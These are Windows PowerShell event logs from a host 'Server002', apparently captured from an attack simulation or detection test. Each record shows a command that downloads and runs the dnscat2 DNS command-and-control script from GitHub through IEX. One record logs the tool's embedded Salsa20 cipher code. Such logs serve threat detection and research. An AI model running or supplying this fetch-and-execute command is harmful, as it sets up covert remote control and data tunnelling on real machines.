{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"800"},"Version":"0","Level":"4","Task":"8","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:14.6219146"},"EventRecordID":"1052","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Add-type -TypeDefinition $source -Language CSharp\r\n, \tDetailSequence=3\r\n\tDetailTotal=3\r\n\r\n\tSequenceNumber=15\r\n\r\n\tUserId=SERVER002\\admin_test\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=b62b237c-1b8d-47cb-b63e-4ee09afb470d\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=Add-type -TypeDefinition $source -Language CSharp\r\n, ParameterBinding(Add-Type): name=\"Language\"; value=\"CSharp\"\r\n","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"800"},"Version":"0","Level":"4","Task":"8","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:14.7897802"},"EventRecordID":"1053","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop\r\n, \tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=17\r\n\r\n\tUserId=SERVER002\\admin_test\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=b62b237c-1b8d-47cb-b63e-4ee09afb470d\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop\r\n, CommandInvocation(Add-Type): \"Add-Type\"\r\nParameterBinding(Add-Type): name=\"TypeDefinition\"; value=\"/*\r\n * This implementation of Salsa20 is ported from the reference implementation\r\n * by D. J. Bernstein, which can be found at:\r\n *   http://cr.yp.to/snuffle/salsa20/ref/salsa20.c\r\n *\r\n * This work is hereby released into the Public Domain. To view a copy of the public domain dedication,\r\n * visit http://creativecommons.org/licenses/publicdomain/ or send a letter to\r\n * Creative Commons, 171 Second Street, Suite 300, San Francisco, California, 94105, USA.\r\n */\r\n\r\nusing System;\r\nusing System.Diagnostics;\r\nusing System.Security.Cryptography;\r\nusing System.Text;\r\n\r\nnamespace Logos.Utility.Security.Cryptography\r\n{\r\n\t/// &lt;summary&gt;\r\n\t/// Implements the Salsa20 stream encryption cipher, as defined at http://cr.yp.to/snuffle.html.\r\n\t/// &lt;/summary&gt;\r\n\t/// &lt;remarks&gt;See &lt;a href=\"http://code.logos.com/blog/2008/06/salsa20_implementation_in_c_1.html\"&gt;Salsa20 Implementation in C#&lt;/a&gt;.&lt;/remarks&gt;\r\n\tpublic sealed class Salsa20 : SymmetricAlgorithm\r\n\t{\r\n\t\t/// &lt;summary&gt;\r\n\t\t/// Initializes a new instance of the &lt;see cref=\"Salsa20\"/&gt; class.\r\n\t\t/// &lt;/summary&gt;\r\n\t\t/// &lt;exception cref=\"CryptographicException\"&gt;The implementation of the class derived from the symmetric algorithm is not valid.&lt;/exception&gt;\r\n\t\tpublic Salsa20()\r\n\t\t{\r\n\t\t\t// set legal values\r\n\t\t\tLegalBlockSizesValue = new KeySizes[] { new KeySizes(512, 512, 0) };\r\n            LegalKeySizesValue   = new KeySizes[] { new KeySizes(128, 256, 128) };\r\n\r\n\t\t\t// set default values\r\n\t\t\tBlockSizeValue = 512;\r\n\t\t\tKeySizeValue = 256;\r\n\t\t\tm_rounds = 20;\r\n\t\t}\r\n\r\n\t\t/// &lt;summary&gt;\r\n\t\t/// Creates a symmetric decryptor object with the specified &lt;see cref=\"SymmetricAlgorithm.Key\"/&gt; property\r\n\t\t/// and initialization vector (&lt;see cref=\"SymmetricAlgorithm.IV\"/&gt;).\r\n\t\t/// &lt;/summary&gt;\r\n\t\t/// &lt;param name=\"rgbKey\"&gt;The secret key to use for the symmetric algorithm.&lt;/param&gt;\r\n\t\t/// &lt;param name=\"rgbIV\"&gt;The initialization vector to use for the symmetric algorithm.&lt;/param&gt;\r\n\t\t/// &lt;returns&gt;A symmetric decryptor object.&lt;/returns&gt;\r\n\t\tpublic override ICryptoTransform CreateDecryptor(byte[] rgbKey, byte[] rgbIV)\r\n\t\t{\r\n\t\t\t// decryption and encryption are symmetrical\r\n\t\t\treturn CreateEncryptor(rgbKey, rgbIV);\r\n\t\t}\r\n\r\n\t\t/// &lt;summary&gt;\r\n\t\t/// Creates a symmetric encryptor object with the specified &lt;see cref=\"SymmetricAlgorithm.Key\"/&gt; property\r\n\t\t/// and initialization vector (&lt;see cref=\"SymmetricAlgorithm.IV\"/&gt;).\r\n\t\t/// &lt;/summary&gt;\r\n\t\t/// &lt;param name=\"rgbKey\"&gt;The secret key to use for the symmetric algorithm.&lt;/param&gt;\r\n\t\t/// &lt;param name=\"rgbIV\"&gt;The initialization vector to use for the symmetric algorithm.&lt;/param&gt;\r\n\t\t/// &lt;returns&gt;A symmetric encryptor object.&lt;/returns&gt;\r\n\t\tpublic override ICryptoTransform CreateEncryptor(byte[] rgbKey, byte[] rgbIV)\r\n\t\t{\r\n\t\t\tif (rgbKey == null)\r\n\t\t\t\tthrow new ArgumentNullException(\"rgbKey\");\r\n\t\t\tif (!ValidKeySize(rgbKey.Length * 8))\r\n\t\t\t\tthrow new CryptographicException(\"Invalid key size; it must be 128 or 256 bits.\");\r\n\t\t\tCheckValidIV(rgbIV, \"rgbIV\");\r\n\r\n\t\t\treturn new Salsa20CryptoTransform(rgbKey, rgbIV, m_rounds);\r\n\t\t}\r\n\r\n\t\t/// &lt;summary&gt;\r\n\t\t/// Generates a random initialization vector (&lt;see cref=\"SymmetricAlgorithm.IV\"/&gt;) to use for the algorithm.\r\n\t\t/// &lt;/summary&gt;\r\n\t\tpublic override void GenerateIV()\r\n\t\t{\r\n\t\t\t// generate a random 8-byte IV\r\n\t\t\tIVValue = GetRandomBytes(8);\r\n\t\t}\r\n\r\n\t\t/// &lt;summary&gt;\r\n\t\t/// Generates a random key (&lt;see cref=\"SymmetricAlgorithm.Key\"/&gt;) to use for the algorithm.\r\n\t\t/// &lt;/summary&gt;\r\n\t\tpublic override void GenerateKey()\r\n\t\t{\r\n\t\t\t// generate a random key\r\n\t\t\tKeyValue = GetRandomBytes(KeySize / 8);\r\n\t\t}\r\n\r\n\t\t/// &lt;summary&gt;\r\n\t\t/// Gets or sets the initialization vector (&lt;see cref=\"SymmetricAlgorithm.IV\"/&gt;) for the symmetric algorithm.\r\n\t\t/// &lt;/summary&gt;\r\n\t\t/// &lt;value&gt;The initialization vector.&lt;/value&gt;\r\n\t\t/// &lt;exception cref=\"ArgumentNullException\"&gt;An attempt was made to set the initialization vector to null. &lt;/exception&gt;\r\n\t\t/// &lt;exception cref=\"CryptographicException\"&gt;An attempt was made to set the initialization vector to an invalid size. &lt;/exception&gt;\r\n\t\tpublic override byte[] IV\r\n\t\t{\r\n\t\t\tget\r\n\t\t\t{\r\n\t\t\t\treturn base.IV;\r\n\t\t\t}\r\n\t\t\tset\r\n\t\t\t{\r\n\t\t\t\tCheckValidIV(value, \"value\");\r\n\t\t\t\tIVValue = (byte[]) value.Clone();\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t/// &lt;summary&gt;\r\n\t\t/// Gets or sets the number of rounds used by the Salsa20 algorithm.\r\n\t\t/// &lt;/summary&gt;\r\n\t\t/// &lt;value&gt;The number of rounds.&lt;/value&gt;\r\n\t\tpublic int Rounds\r\n\t\t{\r\n\t\t\tget\r\n\t\t\t{\r\n\t\t\t\treturn m_rounds;\r\n\t\t\t}\r\n\t\t\tset\r\n\t\t\t{\r\n\t\t\t\tif (value != 8 &amp;&amp; value != 12 &amp;&amp; value != 20)\r\n\t\t\t\t\tthrow new ArgumentOutOfRangeException(\"value\", \"The number of rounds must be 8, 12, or 20.\");\r\n\t\t\t\tm_rounds = value;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// Verifies that iv is a legal value for a Salsa20 IV.\r\n\t\tprivate static void CheckValidIV(byte[] iv, string paramName)\r\n\t\t{\r\n\t\t\tif (iv == null)\r\n\t\t\t\tthrow new ArgumentNullException(paramName);\r\n\t\t\tif (iv.Length != 8)\r\n\t\t\t\tthrow new CryptographicException(\"Invalid IV size; it must be 8 bytes.\");\r\n\t\t}\r\n\r\n\t\t// Returns a new byte array containing the specified number of random bytes.\r\n\t\tprivate static byte[] GetRandomBytes(int byteCount)\r\n\t\t{\r\n\t\t\tbyte[] bytes = new byte[byteCount];\r\n\t\t\t//using (RandomNumberGenerator rng = new RNGCryptoServiceProvider())\r\n            RandomNumberGenerator rng = new RNGCryptoServiceProvider();\r\n\t\t    rng.GetBytes(bytes);\r\n\t\t\treturn bytes;\r\n\t\t}\r\n\r\n\t\tint m_rounds;\r\n\r\n\t\t/// &lt;summary&gt;\r\n\t\t/// Salsa20Impl is an implementation of &lt;see cref=\"ICryptoTransform\"/&gt; that uses the Salsa20 algorithm.\r\n\t\t/// &lt;/summary&gt;\r\n\t\tprivate sealed class Salsa20CryptoTransform : ICryptoTransform\r\n\t\t{\r\n\t\t\tpublic Salsa20CryptoTransform(byte[] key, byte[] iv, int rounds)\r\n\t\t\t{\r\n\t\t\t\tDebug.Assert(key.Length == 16 || key.Length == 32, \"abyKey.Length == 16 || abyKey.Length == 32\", \"Invalid key size.\");\r\n\t\t\t\tDebug.Assert(iv.Length == 8, \"abyIV.Length == 8\", \"Invalid IV size.\");\r\n\t\t\t\tDebug.Assert(rounds == 8 || rounds == 12 || rounds == 20, \"rounds == 8 || rounds == 12 || rounds == 20\", \"Invalid number of rounds.\");\r\n\r\n\t\t\t\tInitialize(key, iv);\r\n\t\t\t\tm_rounds = rounds;\r\n\t\t\t}\r\n\r\n\t\t\tpublic bool CanReuseTransform\r\n\t\t\t{\r\n\t\t\t\tget { return false; }\r\n\t\t\t}\r\n\r\n\t\t\tpublic bool CanTransformMultipleBlocks\r\n\t\t\t{\r\n\t\t\t\tget { return true; }\r\n\t\t\t}\r\n\r\n\t\t\tpublic int InputBlockSize\r\n\t\t\t{\r\n\t\t\t\tget { return 64; }\r\n\t\t\t}\r\n\r\n\t\t\tpublic int OutputBlockSize\r\n\t\t\t{\r\n\t\t\t\tget { return 64; }\r\n\t\t\t}\r\n\r\n\t\t\tpublic int TransformBlock(byte[] inputBuffer, int inputOffset, int inputCount, byte[] outputBuffer, int outputOffset)\r\n\t\t\t{\r\n\t\t\t\t// check arguments\r\n\t\t\t\tif (inputBuffer == null)\r\n\t\t\t\t\tthrow new ArgumentNullException(\"inputBuffer\");\r\n\t\t\t\tif (inputOffset &lt; 0 || inputOffset &gt;= inputBuffer.Length)\r\n\t\t\t\t\tthrow new ArgumentOutOfRangeException(\"inputOffset\");\r\n\t\t\t\tif (inputCount &lt; 0 || inputOffset + inputCount &gt; inputBuffer.Length)\r\n\t\t\t\t\tthrow new ArgumentOutOfRangeException(\"inputCount\");\r\n\t\t\t\tif (outputBuffer == null)\r\n\t\t\t\t\tthrow new ArgumentNullException(\"outputBuffer\");\r\n\t\t\t\tif (outputOffset &lt; 0 || outputOffset + inputCount &gt; outputBuffer.Length)\r\n\t\t\t\t\tthrow new ArgumentOutOfRangeException(\"outputOffset\");\r\n\t\t\t\tif (m_state == null)\r\n\t\t\t\t\tthrow new ObjectDisposedException(GetType().Name);\r\n\r\n\t\t\t\tbyte[] output = new byte[64];\r\n\t\t\t\tint bytesTransformed = 0;\r\n\r\n\t\t\t\twhile (inputCount &gt; 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tHash(output, m_state);\r\n\t\t\t\t\tm_state[8] = AddOne(m_state[8]);\r\n\t\t\t\t\tif (m_state[8] == 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\t// NOTE: stopping at 2^70 bytes per nonce is user's responsibility\r\n\t\t\t\t\t\tm_state[9] = AddOne(m_state[9]);\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t\tint blockSize = Math.Min(64, inputCount);\r\n\t\t\t\t\tfor (int i = 0; i &lt; blockSize; i++)\r\n\t\t\t\t\t\toutputBuffer[outputOffset + i] = (byte) (inputBuffer[inputOffset + i] ^ output[i]);\r\n\t\t\t\t\tbytesTransformed += blockSize;\r\n\r\n\t\t\t\t\tinputCount -= 64;\r\n\t\t\t\t\toutputOffset += 64;\r\n\t\t\t\t\tinputOffset += 64;\r\n\t\t\t\t}\r\n\r\n\t\t\t\treturn bytesTransformed;\r\n\t\t\t}\r\n\r\n\t\t\tpublic byte[] TransformFinalBlock(byte[] inputBuffer, int inputOffset, int inputCount)\r\n\t\t\t{\r\n\t\t\t\tif (inputCount &lt; 0)\r\n\t\t\t\t\tthrow new ArgumentOutOfRangeException(\"inputCount\");\r\n\r\n\t\t\t\tbyte[] output = new byte[inputCount];\r\n\t\t\t\tTransformBlock(inputBuffer, inputOffset, inputCount, output, 0);\r\n\t\t\t\treturn output;\r\n\t\t\t}\r\n\r\n\t\t\tpublic void Dispose()\r\n\t\t\t{\r\n\t\t\t\tif (m_state != null)\r\n\t\t\t\t\tArray.Clear(m_state, 0, m_state.Length);\r\n\t\t\t\tm_state = null;\r\n\t\t\t}\r\n\r\n\t\t\tprivate static uint Rotate(uint v, int c)\r\n\t\t\t{\r\n\t\t\t\treturn (v &lt;&lt; c) | (v &gt;&gt; (32 - c));\r\n\t\t\t}\r\n\r\n\t\t\tprivate static uint Add(uint v, uint w)\r\n\t\t\t{\r\n\t\t\t\treturn unchecked(v + w);\r\n\t\t\t}\r\n\r\n\t\t\tprivate static uint AddOne(uint v)\r\n\t\t\t{\r\n\t\t\t\treturn unchecked(v + 1);\r\n\t\t\t}\r\n\r\n\t\t\tprivate void Hash(byte[] output, uint[] input)\r\n\t\t\t{\r\n\t\t\t\tuint[] state = (uint[]) input.Clone();\r\n\r\n\t\t\t\tfor (int round = m_rounds; round &gt; 0; round -= 2)\r\n\t\t\t\t{\r\n\t\t\t\t\tstate[4] ^= Rotate(Add(state[0], state[12]), 7);\r\n\t\t\t\t\tstate[8] ^= Rotate(Add(state[4], state[0]), 9);\r\n\t\t\t\t\tstate[12] ^= Rotate(Add(state[8], state[4]), 13);\r\n\t\t\t\t\tstate[0] ^= Rotate(Add(state[12], state[8]), 18);\r\n\t\t\t\t\tstate[9] ^= Rotate(Add(state[5], state[1]), 7);\r\n\t\t\t\t\tstate[13] ^= Rotate(Add(state[9], state[5]), 9);\r\n\t\t\t\t\tstate[1] ^= Rotate(Add(state[13], state[9]), 13);\r\n\t\t\t\t\tstate[5] ^= Rotate(Add(state[1], state[13]), 18);\r\n\t\t\t\t\tstate[14]  ^= Rotate(Add(state[10], state[6]), 7);\r\n\t\t\t\t\tstate[2] ^= Rotate(Add(state[14], state[10]), 9);\r\n\t\t\t\t\tstate[6] ^= Rotate(Add(state[2], state[14]), 13);\r\n\t\t\t\t\tstate[10]  ^= Rotate(Add(state[6], state[2]), 18);\r\n\t\t\t\t\tstate[3] ^= Rotate(Add(state[15], state[11]), 7);\r\n\t\t\t\t\tstate[7] ^= Rotate(Add(state[3], state[15]), 9);\r\n\t\t\t\t\tstate[11]  ^= Rotate(Add(state[7], state[3]), 13);\r\n\t\t\t\t\tstate[15]  ^= Rotate(Add(state[11], state[7]), 18);\r\n\t\t\t\t\tstate[1] ^= Rotate(Add(state[0], state[3]), 7);\r\n\t\t\t\t\tstate[2] ^= Rotate(Add(state[1], state[0]), 9);\r\n\t\t\t\t\tstate[3] ^= Rotate(Add(state[2], state[1]), 13);\r\n\t\t\t\t\tstate[0] ^= Rotate(Add(state[3], state[2]), 18);\r\n\t\t\t\t\tstate[6] ^= Rotate(Add(state[5], state[4]), 7);\r\n\t\t\t\t\tstate[7] ^= Rotate(Add(state[6], state[5]), 9);\r\n\t\t\t\t\tstate[4] ^= Rotate(Add(state[7], state[6]), 13);\r\n\t\t\t\t\tstate[5] ^= Rotate(Add(state[4], state[7]), 18);\r\n\t\t\t\t\tstate[11]  ^= Rotate(Add(state[10], state[9]), 7);\r\n\t\t\t\t\tstate[8] ^= Rotate(Add(state[11], state[10]), 9);\r\n\t\t\t\t\tstate[9] ^= Rotate(Add(state[8], state[11]), 13);\r\n\t\t\t\t\tstate[10]  ^= Rotate(Add(state[9], state[8]), 18);\r\n\t\t\t\t\tstate[12]  ^= Rotate(Add(state[15], state[14]), 7);\r\n\t\t\t\t\tstate[13]  ^= Rotate(Add(state[12], state[15]), 9);\r\n\t\t\t\t\tstate[14]  ^= Rotate(Add(state[13], state[12]), 13);\r\n\t\t\t\t\tstate[15]  ^= Rotate(Add(state[14], state[13]), 18);\r\n\t\t\t\t}\r\n\r\n\t\t\t\tfor (int index = 0; index &lt; 16; index++)\r\n\t\t\t\t\tToBytes(Add(state[index], input[index]), output, 4 * index);\r\n\t\t\t}\r\n\r\n\t\t\tprivate void Initialize(byte[] key, byte[] iv)\r\n\t\t\t{\r\n\t\t\t\tm_state = new uint[16];\r\n\t\t\t\tm_state[1] = ToUInt32(key, 0);\r\n\t\t\t\tm_state[2] = ToUInt32(key, 4);\r\n\t\t\t\tm_state[3] = ToUInt32(key, 8);\r\n\t\t\t\tm_state[4] = ToUInt32(key, 12);\r\n\r\n\t\t\t\tbyte[] constants = key.Length == 32 ? c_sigma : c_tau;\r\n\t\t\t\tint keyIndex = key.Length - 16;\r\n\r\n\t\t\t\tm_state[11] = ToUInt32(key, keyIndex + 0);\r\n\t\t\t\tm_state[12] = ToUInt32(key, keyIndex + 4);\r\n\t\t\t\tm_state[13] = ToUInt32(key, keyIndex + 8);\r\n\t\t\t\tm_state[14] = ToUInt32(key, keyIndex + 12);\r\n\t\t\t\tm_state[0] = ToUInt32(constants, 0);\r\n\t\t\t\tm_state[5] = ToUInt32(constants, 4);\r\n\t\t\t\tm_state[10] = ToUInt32(constants, 8);\r\n\t\t\t\tm_state[15] = ToUInt32(constants, 12);\r\n\r\n\t\t\t\tm_state[6] = ToUInt32(iv, 0);\r\n\t\t\t\tm_state[7] = ToUInt32(iv, 4);\r\n\t\t\t\tm_state[8] = 0;\r\n\t\t\t\tm_state[9] = 0;\r\n\t\t\t}\r\n\r\n\t\t\tprivate static uint ToUInt32(byte[] input, int inputOffset)\r\n\t\t\t{\r\n\t\t\t\treturn unchecked((uint) (((input[inputOffset] | (input[inputOffset + 1] &lt;&lt; 8)) | (input[inputOffset + 2] &lt;&lt; 16)) | (input[inputOffset + 3] &lt;&lt; 24)));\r\n\t\t\t}\r\n\r\n\t\t\tprivate static void ToBytes(uint input, byte[] output, int outputOffset)\r\n\t\t\t{\r\n\t\t\t\tunchecked\r\n\t\t\t\t{\r\n\t\t\t\t\toutput[outputOffset] = (byte) input;\r\n\t\t\t\t\toutput[outputOffset + 1] = (byte) (input &gt;&gt; 8);\r\n\t\t\t\t\toutput[outputOffset + 2] = (byte) (input &gt;&gt; 16);\r\n\t\t\t\t\toutput[outputOffset + 3] = (byte) (input &gt;&gt; 24);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\tstatic readonly byte[] c_sigma = Encoding.ASCII.GetBytes(\"expand 32-byte k\");\r\n\t\t\tstatic readonly byte[] c_tau = Encoding.ASCII.GetBytes(\"expand 16-byte k\");\r\n\r\n\t\t\tuint[] m_state;\r\n\t\t\treadonly int m_rounds;\r\n\t\t}\r\n\t}\r\n}\"\r\nParameterBinding(Add-Type): name=\"Language\"; value=\"CSharp\"\r\nParameterBinding(Add-Type): name=\"ErrorAction\"; value=\"Stop\"\r\n","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:34.0874279"},"EventRecordID":"1054","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=19\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=b62b237c-1b8d-47cb-b63e-4ee09afb470d\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
